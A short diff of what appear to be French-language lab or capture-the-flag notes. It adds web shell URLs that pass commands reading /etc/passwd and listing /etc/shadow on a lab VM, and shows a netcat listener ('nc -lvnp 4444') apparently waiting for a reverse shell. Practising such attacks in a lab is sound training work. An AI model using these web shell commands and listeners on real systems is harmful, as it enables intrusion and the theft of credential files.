@@ -57,6 +57,5 @@ pwd: Entrée (le bouton)
 nc -lvnp 4444
 
 # mettre ceci dans le navigateur:
-http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
-
-# 
+- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
+- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
